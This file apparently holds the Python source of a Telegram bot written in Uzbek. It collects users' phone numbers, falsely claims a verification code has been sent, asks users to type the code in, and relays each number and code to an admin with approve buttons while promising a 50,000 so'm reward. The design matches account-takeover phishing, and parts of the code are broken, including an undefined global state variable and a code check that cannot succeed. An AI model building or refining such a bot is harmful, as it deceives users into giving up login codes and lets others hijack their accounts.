import asyncio
import random
import asyncpg
import os
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
DATABASE_URL = os.getenv("DATABASE_URL")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

# ================= HOLATLAR =================
user_states = {}
user_phones = {}

# ================= TUGMALAR =================
phone_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton("📞 Telefon raqamni yuborish", request_contact=True)]],
    resize_keyboard=True
)

admin_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton("📊 Statistika")],
        [KeyboardButton("📨 Barchaga xabar")],
        [KeyboardButton("📋 Kodlar")]
    ],
    resize_keyboard=True
)

# ================= DATABASE =================
async def get_db():
    return await asyncpg.connect(DATABASE_URL)

async def init_db():
    conn = await get_db()
    try:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT UNIQUE NOT NULL,
                phone VARCHAR(20) NOT NULL,
                balance INTEGER DEFAULT 0
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS codes (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) NOT NULL,
                code VARCHAR(10) NOT NULL,
                telegram_id BIGINT NOT NULL,
                status VARCHAR(20) DEFAULT 'pending'
            )
        """)
        logger.info("✅ DB ready")
    finally:
        await conn.close()

# ================= 1. START =================
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("👋 Admin panel", reply_markup=admin_menu)
        return
    
    user_states[message.from_user.id] = "waiting_phone"
    await message.answer(
        "📱 Telefon raqamingizni yuboring:",
        reply_markup=phone_keyboard
    )

# ================= 2. TELEFON =================
@dp.message_handler(content_types=['contact'])
async def receive_phone(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        return
    
    phone = message.contact.phone_number
    telegram_id = message.from_user.id
    
    user_phones[telegram_id] = phone
    user_states[telegram_id] = "waiting_code"
    
    # Bazaga saqlash
    conn = await get_db()
    try:
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
            "ON CONFLICT (telegram_id) DO UPDATE SET phone = $2",
            telegram_id, phone
        )
    finally:
        await conn.close()
    
    # Kod yaratish
    code = str(random.randint(100000, 999999))
    
    # Kodni saqlash
    conn = await get_db()
    try:
        await conn.execute(
            "INSERT INTO codes (phone, code, telegram_id) VALUES ($1, $2, $3)",
            phone, code, telegram_id
        )
    finally:
        await conn.close()
    
    # Foydalanuvchiga
    await message.answer(f"✅ {phone} ga kod yuborildi!\n📨 Kodni kiriting:")
    
    # Admin'ga
    await bot.send_message(
        ADMIN_ID,
        f"📱 Yangi foydalanuvchi\nID: {telegram_id}\nTel: {phone}\nKod: {code}"
    )

# ================= 3. KOD =================
@dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
async def receive_code(message: types.Message):
    code = message.text.strip()
    telegram_id = message.from_user.id
    phone = user_phones.get(telegram_id)
    
    if not phone or len(code) != 6:
        await message.answer("❌ 6 xonali kod kiriting:")
        return
    
    conn = await get_db()
    try:
        existing = await conn.fetchrow(
            "SELECT * FROM codes WHERE phone = $1 AND code = $2 AND status = 'pending'",
            phone, code
        )
        
        if existing:
            await message.answer("⏳ Kod qabul qilindi! Admin tekshirmoqda...")
            
            # Admin tugmalari
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton("✅ Tasdiqlash", callback_data=f"yes_{telegram_id}_{phone}_{code}")],
                    [InlineKeyboardButton("❌ Rad etish", callback_data=f"no_{telegram_id}")]
                ]
            )
            
            await bot.send_message(
                ADMIN_ID,
                f"🔑 Kod keldi!\nID: {telegram_id}\nTel: {phone}\nKod: {code}",
                reply_markup=keyboard
            )
            
            user_states[telegram_id] = "done"
        else:
            await message.answer("❌ Noto'g'ri kod!")
    finally:
        await conn.close()

# ================= 4. ADMIN TASDIQLASH =================
@dp.callback_query_handler(lambda c: c.data.startswith(("yes_", "no_")))
async def admin_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    if action == "yes":
        telegram_id = int(data[1])
        phone = data[2]
        code = data[3]
        
        conn = await get_db()
        try:
            await conn.execute(
                "UPDATE codes SET status = 'verified' "
                "WHERE phone = $1 AND code = $2",
                phone, code
            )
            
            await conn.execute(
                "UPDATE users SET balance = balance + 50000 WHERE telegram_id = $1",
                telegram_id
            )
            
            await bot.send_message(
                telegram_id,
                "✅ Tasdiqlandi! 🎉\n💰 +50 000 so'm"
            )
            
            await callback.message.edit_text(
                f"✅ Tasdiqlandi!\nID: {telegram_id}\nTel: {phone}"
            )
            await callback.answer("✅ OK")
        finally:
            await conn.close()
    
    elif action == "no":
        telegram_id = int(data[1])
        
        conn = await get_db()
        try:
            await conn.execute(
                "UPDATE codes SET status = 'expired' WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            await bot.send_message(
                telegram_id,
                "❌ Kod rad etildi!"
            )
            
            await callback.message.edit_text(f"❌ Rad etildi!\nID: {telegram_id}")
            await callback.answer("❌ OK")
        finally:
            await conn.close()

# ================= 5. ADMIN STATISTIKA =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
async def stats(message: types.Message):
    conn = await get_db()
    try:
        users = await conn.fetchval("SELECT COUNT(*) FROM users")
        pending = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'pending'")
        verified = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
        
        await message.answer(
            f"📊 Statistika\n\n"
            f"👥 Foydalanuvchilar: {users}\n"
            f"⏳ Kutayotgan: {pending}\n"
            f"✅ Tasdiqlangan: {verified}"
        )
    finally:
        await conn.close()

# ================= 6. KODLAR =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kodlar")
async def pending_codes(message: types.Message):
    conn = await get_db()
    try:
        codes = await conn.fetch(
            "SELECT * FROM codes WHERE status = 'pending' ORDER BY id DESC LIMIT 10"
        )
        
        if codes:
            text = "📋 Kutayotgan kodlar:\n\n"
            for c in codes:
                text += f"ID: {c['telegram_id']}\nTel: {c['phone']}\nKod: {c['code']}\n---\n"
            await message.answer(text)
        else:
            await message.answer("📭 Yo'q")
    finally:
        await conn.close()

# ================= 7. BARCHAGA XABAR =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
async def broadcast_start(message: types.Message):
    admin_states = {}
    admin_states[ADMIN_ID] = "waiting_msg"
    await message.answer("📨 Xabar matnini yozing:")

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_msg")
async def broadcast_send(message: types.Message):
    admin_states = {}
    text = message.text
    admin_states.pop(ADMIN_ID, None)
    
    conn = await get_db()
    try:
        users = await conn.fetch("SELECT telegram_id FROM users")
        
        if not users:
            await message.answer("❌ Foydalanuvchilar yo'q!")
            return
        
        sent = 0
        for user in users:
            try:
                await bot.send_message(user['telegram_id'], f"📨 Xabar\n\n{text}")
                sent += 1
                await asyncio.sleep(0.05)
            except:
                pass
        
        await message.answer(f"✅ Yuborildi: {sent} ta")
    finally:
        await conn.close()

# ================= 8. BALANS =================
@dp.message_handler(commands=['balance'])
async def balance(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        return
    
    conn = await get_db()
    try:
        user = await conn.fetchrow(
            "SELECT balance FROM users WHERE telegram_id = $1",
            message.from_user.id
        )
        
        if user:
            await message.answer(f"💰 Balans: {user['balance']:,} so'm")
        else:
            await message.answer("❌ Ro'yxatdan o'tmagansiz")
    finally:
        await conn.close()

# ================= MAIN =================
async def main():
    logger.info("🤖 Bot ishga tushmoqda...")
    await init_db()
    logger.info("✅ Bot ready!")
    await dp.start_polling()

if __name__ == "__main__":
    asyncio.run(main())
